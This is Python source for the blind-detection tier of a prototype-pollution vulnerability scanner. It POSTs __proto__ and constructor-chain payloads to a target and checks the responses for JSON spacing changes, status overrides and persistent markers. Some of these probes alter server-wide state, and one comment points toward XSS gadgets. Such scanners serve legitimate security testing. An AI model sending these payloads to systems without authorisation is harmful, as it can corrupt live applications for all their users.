"""
ppmap/scanner/tier1_blind.py - Tier 1: Blind Server-Side Prototype Pollution Detection

Techniques that detect PP without requiring browser execution by looking for
behavioral side-channels in HTTP responses.

Methods:
    - JSON Spaces Overflow (Express.js side-channel)
    - HTTP Status Code Override (418 / 510 responses)
    - Function.prototype Chain Pollution (constructor.constructor)
    - Persistence Verification (cross-request marker survival)

Extracted from: scanner/core.py lines 2219–2550
"""

import time
import logging
from typing import Any, Dict, List

from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors, progress_iter

logger = logging.getLogger(__name__)


class Tier1BlindScanner(BaseTierScanner):
    """Blind server-side PP detection via timing and behavioral side-channels."""

    @property
    def tier_name(self) -> str:
        return "Tier 1 - Blind Detection"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        raw: List[Dict[str, Any]] = []

        raw += self._test_json_spaces_overflow(ctx)
        raw += self._test_status_code_override(ctx)
        raw += self._test_function_prototype_chain(ctx)
        raw += self._test_persistence_verification(ctx)

        findings = [self._to_finding(r, ctx.target_url) for r in raw]
        if not findings:
            self.log_clean()
        return findings

    # ──────────────────────────────────────────────────────────────────────────
    # Internal test methods (extracted verbatim from core.py, adapted to use
    # self.session = ctx.session for testability)
    # ──────────────────────────────────────────────────────────────────────────

    def _test_json_spaces_overflow(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Blind server-side PP detection via JSON indentation override.
        Sends {"__proto__": {"json spaces": 10}} to check if response formatting changes.
        Works specifically with Express.js servers.
        """
        print(f"{Colors.CYAN}[→] Testing blind JSON spaces overflow detection...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        try:
            baseline_payload = {"test": "baseline"}
            baseline_resp = session.post(target_url, json=baseline_payload, timeout=5, verify=False)
            baseline_text = baseline_resp.text

            pollution_payload = {
                "__proto__": {"json spaces": 10},
                "test": "pollution",
            }
            pollution_resp = session.post(target_url, json=pollution_payload, timeout=5, verify=False)
            pollution_text = pollution_resp.text

            if "json spaces" in target_url or "express" in target_url.lower():
                if len(pollution_text) > len(baseline_text) * 1.3:
                    findings.append({
                        "type": "blind_pp_detected",
                        "method": "JSON_SPACES_OVERFLOW",
                        "severity": "HIGH",
                        "description": "Server-side PP detected via JSON indentation change",
                        "payload": pollution_payload,
                    })
                    print(f"{Colors.WARNING}[!] HIGH: Blind PP via JSON spaces overflow detected!{Colors.ENDC}")

            verification_payload = {"verify": "check"}
            verify_resp = session.post(target_url, json=verification_payload, timeout=5, verify=False)

            if len(verify_resp.text) > len(baseline_text) * 1.3:
                findings.append({
                    "type": "persistent_pp",
                    "method": "JSON_SPACES_PERSISTENCE",
                    "severity": "CRITICAL",
                    "description": "Prototype pollution is PERSISTENT across requests (all users affected)",
                    "payload": pollution_payload,
                })
                print(f"{Colors.FAIL}[!] CRITICAL: Persistent PP detected - affects all users!{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] JSON spaces test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_status_code_override(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Blind server-side PP detection via HTTP status code override.
        Sends {"__proto__": {"status": 418}} and checks if status changes.
        """
        print(f"{Colors.CYAN}[→] Testing status code override detection...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        try:
            for code in [418, 510]:
                pollution_payload = {"__proto__": {"status": code}, "trigger_error": True}
                resp = session.post(target_url, json=pollution_payload, timeout=5, verify=False)
                if resp.status_code == code:
                    findings.append({
                        "type": "status_override_detected",
                        "method": f"STATUS_CODE_{code}",
                        "severity": "HIGH",
                        "description": f"Server-side PP detected via HTTP {code} status override",
                        "payload": pollution_payload,
                        "status_code": resp.status_code,
                    })
                    print(f"{Colors.WARNING}[!] HIGH: Status code override ({code}) detected!{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Status code test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_function_prototype_chain(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Test Function.prototype pollution (advanced bypass).
        Targets constructor.constructor.prototype chains (e.g., minimist CVE-2021-44906).
        """
        print(f"{Colors.CYAN}[→] Testing Function.prototype chain pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        function_proto_payloads = [
            {"constructor": {"constructor": {"prototype": {"polluted": "ppmap_func_proto"}}}},
            {"__proto__": {"constructor": {"prototype": {"vulnerable": "ppmap_func_proto"}}}},
            {"constructor": {"prototype": {"gadget": "ppmap_func_proto"}}},
            {"__proto__": {"constructor": {"constructor": {"prototype": {"rce": "ppmap_func_proto"}}}}},
        ]

        try:
            for payload in progress_iter(function_proto_payloads, desc="Function.prototype"):
                try:
                    resp = session.post(target_url, json=payload, timeout=5, verify=False)
                    if "ppmap_func_proto" in resp.text.lower():
                        findings.append({
                            "type": "function_prototype_pollution",
                            "method": "CONSTRUCTOR_CHAIN",
                            "severity": "HIGH",
                            "description": "Function.prototype pollution via constructor chain detected",
                            "payload": str(payload),
                            "indicator": "ppmap_func_proto reflected (pollution successful)",
                        })
                        print(f"{Colors.WARNING}[!] HIGH: Function.prototype chain pollution detected!{Colors.ENDC}")
                        break
                except Exception:
                    pass

            url_payloads = [
                "?constructor[constructor][prototype][polluted]=ppmap_polluted",
                "?__proto__[constructor][prototype][vulnerable]=ppmap_polluted",
                "?a[constructor][prototype][x]=ppmap_polluted",
            ]

            for url_param in url_payloads:
                try:
                    test_url = target_url + url_param
                    resp = session.get(test_url, timeout=5, verify=False)
                    js_pollution_patterns = [
                        "constructor.prototype",
                        "__proto__.constructor",
                        "Object.prototype",
                    ]
                    if any(pat in resp.text for pat in js_pollution_patterns):
                        findings.append({
                            "type": "function_prototype_pollution",
                            "method": "URL_CONSTRUCTOR_CHAIN",
                            "severity": "HIGH",
                            "description": "Function.prototype pollution via URL constructor chain",
                            "payload": url_param,
                            "status_code": resp.status_code,
                            "test_url": test_url,
                            "note": "Detection payload. Combine with descriptor gadgets for XSS.",
                        })
                        print(f"{Colors.WARNING}[!] HIGH: URL-based Function.prototype pollution detected!{Colors.ENDC}")
                        break
                except Exception:
                    pass

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Function.prototype test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_persistence_verification(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Verify if prototype pollution is PERSISTENT across multiple requests.
        Critical for server-side exploitation assessment.
        """
        print(f"{Colors.CYAN}[→] Testing PP persistence across requests...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        try:
            marker = f"persist_{int(time.time() * 1000)}"
            pollution_payload = {"__proto__": {"marker": marker, "polluted": True}}
            session.post(target_url, json=pollution_payload, timeout=5, verify=False)

            resp2 = session.post(target_url, json={"test": "clean"}, timeout=5, verify=False)
            resp3 = session.get(target_url, timeout=5, verify=False)

            if any(marker in r.text or "polluted" in r.text for r in [resp2, resp3]):
                findings.append({
                    "type": "persistent_prototype_pollution",
                    "method": "CROSS_REQUEST_PERSISTENCE",
                    "severity": "CRITICAL",
                    "description": "Prototype pollution PERSISTS across requests - affects all users and sessions",
                    "payload": pollution_payload,
                    "impact": "Server-wide compromise. All users affected until server restart.",
                })
                print(f"{Colors.FAIL}[!] CRITICAL: PP is PERSISTENT - affects entire application!{Colors.ENDC}")
            else:
                print(f"{Colors.GREEN}[✓] PP is non-persistent (limited to current request){Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Persistence verification error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    # ──────────────────────────────────────────────────────────────────────────
    # Adapter: raw dict → structured Finding (for backward compat with reports)
    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _to_finding(raw: Dict[str, Any], url: str) -> Finding:
        severity_map = {
            "CRITICAL": Severity.CRITICAL,
            "HIGH": Severity.HIGH,
            "MEDIUM": Severity.MEDIUM,
            "LOW": Severity.LOW,
        }
        return Finding(
            name=raw.get("description", raw.get("type", "PP Finding")),
            severity=severity_map.get(raw.get("severity", "MEDIUM"), Severity.MEDIUM),
            type=VulnerabilityType.PROTOTYPE_POLLUTION,
            url=url,
            method=raw.get("method", ""),
            payload=str(raw.get("payload", "")),
            evidence=str(raw.get("indicator", raw.get("status_code", ""))),
            description=raw.get("description", ""),
        )
